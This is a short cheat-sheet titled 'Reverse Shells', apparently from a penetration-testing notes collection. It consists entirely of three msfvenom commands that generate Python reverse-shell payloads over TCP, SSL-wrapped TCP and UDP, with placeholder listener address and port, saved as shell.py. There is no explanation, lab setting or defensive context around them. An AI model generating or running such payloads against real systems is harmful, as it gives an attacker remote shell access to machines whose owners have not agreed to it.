# Reverse Shells

`$ msfvenom -p python/shell_reverse_tcp lhost=<IP> lport=<PORT> -o shell.py`

`$ msfvenom -p python/shell_reverse_tcp_ssl lhost=<IP> lport=<PORT> -o shell.py`

`$ msfvenom -p python/shell_reverse_udp lhost=<IP> lport=<PORT> -o shell.py`